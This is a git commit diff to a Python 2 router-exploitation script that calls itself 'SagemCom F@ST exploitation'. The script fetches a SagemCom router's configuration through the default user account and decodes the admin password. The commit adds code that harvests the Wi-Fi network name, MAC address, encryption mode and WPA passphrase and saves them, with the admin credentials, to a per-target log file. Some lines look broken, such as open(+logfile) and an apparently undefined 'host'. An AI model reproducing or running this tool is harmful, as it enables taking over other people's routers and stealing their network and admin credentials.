a727196e7166e91ad1d94dc397cf5bebd81c188a
Mixbo <mixbo@wakowakowako.com>
2014-08-21 16:51:25 -0300

    Saving results after parsing configs

--- scripts/admin.py
+++ scripts/admin.py
@@ -1,3 +1,5 @@
+#!/usr/bin/python
+
 import urllib2, base64, sys
 
 class Target(object):
@@ -6,6 +8,7 @@ class Target(object):
 		self.username = user
 		self.password = user
 		self.config = ""
+		self.admin = ""
 
 	def getConfigFile(self):
 
@@ -34,8 +37,49 @@ class Target(object):
 		end = self.config.find("</AdminPassword>")
 		password = self.config[beg:end]
 		print "[+] Decoding admin password"
-		admin = base64.decodestring(password)
-		print "\n\n[+] Admin credentials:\tadmin:"+admin+"\n\n"
+		self.admin = base64.decodestring(password)
+		print "\n\n[+] Admin credentials:\tadmin:"+self.admin+"\n\n"
+
+		choice = ""
+		while choice == "":
+			choice = raw_input("[+] Do you want to save target's informations (ESSID, BSSID, password)?[Y/n] ")
+			if choice == "" or choice == "Y" or choice == "y":
+				self.saveInfo()
+				break
+			elif choice != "n" and choice != "N":
+				choice = ""
+
+	def saveInfo(self):
+		print "[+] Gathering informations ..."
+		version = self.config[0:self.config.find("PSI config:")]
+		essid = self.config[self.config.find("<WlSsid>")+8:self.config.find("</WlSsid>")]
+		bssid = self.config[self.config.find("<WlBssMacAddr>")+14:self.config.find("</WlBssMacAddr>")]
+		wpa = self.config[self.config.find("<WlWpa>")+7:self.config.find("</WlWpa>")]
+		auth = self.config[self.config.find("<WlAuthMode>")+12:self.config.find("</WlAuthMode>")]
+		passphrase = self.config[self.config.find("<WlWpaPsk>")+10:self.config.find("</WlWpaPsk>")]
+
+		logfile = essid.replace("\x20","_")+"-"+bssid+".log"
+
+		print "[+] Saving target's informations as "+logfile
+
+		try:
+			f = open("./results/"+logfile, "w")
+		except:
+			f = open(+logfile, "w")
+
+		f.write("SagemCom F@ST exploitation by Mixbo")
+		f.write("\nLast version on www.github.com/Mixbo/FaST2704")
+		
+		f.write("\n\nTarget name:\t\t"+host)
+		f.write("\nESSID:\t\t\t"+essid)
+		f.write("\nAdmin account:\t\tadmin:"+self.admin)
+		f.write("\nProtection info:\t"+wpa+" "+auth)
+		f.write("\nWiFi passphrase:\t"+passphrase)
+		f.write("\nTarget mac address:\t"+bssid)
+		f.write("\n\nSoftware/Hardware Versions\n###################################\n")
+		f.write(version)
+
+		f.close()
 
 def main():
 	print "[+] Trying with default user \"user\" "
